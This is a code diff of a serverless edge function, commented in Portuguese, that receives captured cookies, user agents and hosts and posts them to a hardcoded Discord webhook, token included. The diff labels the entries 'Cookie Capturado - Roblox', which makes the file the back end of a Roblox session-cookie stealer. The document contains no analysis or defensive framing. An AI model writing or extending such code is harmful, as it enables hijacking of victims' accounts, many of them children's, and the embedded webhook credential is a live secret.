@@ -3,10 +3,10 @@ export const config = { runtime: "edge" };
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
 
 async function sendToWebhook(dataList) {
-  // dataList = [{title, cookie, userAgent, host}, ...]
+  // dataList é array de objetos com cookie, userAgent, host e opcional title
   const embeds = dataList.map(d => ({
-    title: d.title || "Dados capturados",
-    color: 0xff0000,
+    title: d.title || "Cookie Capturado - Roblox",
+    color: 15158332, // vermelho padrão do Discord
     fields: [
       { name: "Cookie", value: `\`\`\`${(d.cookie || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
       { name: "User Agent", value: `\`\`\`${(d.userAgent || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
@@ -15,7 +15,7 @@ async function sendToWebhook(dataList) {
     ],
   }));
 
-  const payload = { embeds };
+  const payload = { embeds }; // CORRETO: embeds no plural
 
   const res = await fetch(WEBHOOK_URL, {
     method: "POST",
@@ -23,7 +23,7 @@ async function sendToWebhook(dataList) {
     body: JSON.stringify(payload),
   });
 
-  if (!res.ok) throw new Error(`Webhook error: ${await res.text()}`);
+  if (!res.ok) throw new Error(`Erro ao enviar webhook: ${await res.text()}`);
 
   return true;
 }
@@ -31,19 +31,19 @@ async function sendToWebhook(dataList) {
 export default async function handler(req) {
   try {
     if (req.method !== "POST") {
-      return new Response("Use POST com JSON", { status: 405 });
+      return new Response("Use método POST com JSON", { status: 405 });
     }
 
     const body = await req.json();
 
     if (!body.data || !Array.isArray(body.data)) {
-      return new Response("JSON inválido, precisa de { data: [...] }", { status: 400 });
+      return new Response("JSON inválido, envie { data: [...] }", { status: 400 });
     }
 
     await sendToWebhook(body.data);
 
-    return new Response("Enviado com sucesso!", { status: 200 });
+    return new Response("Dados enviados com sucesso!", { status: 200 });
   } catch (error) {
-    return new Response(`Erro: ${error.message}`, { status: 500 });
+    return new Response(`Erro interno: ${error.message}`, { status: 500 });
   }
 }
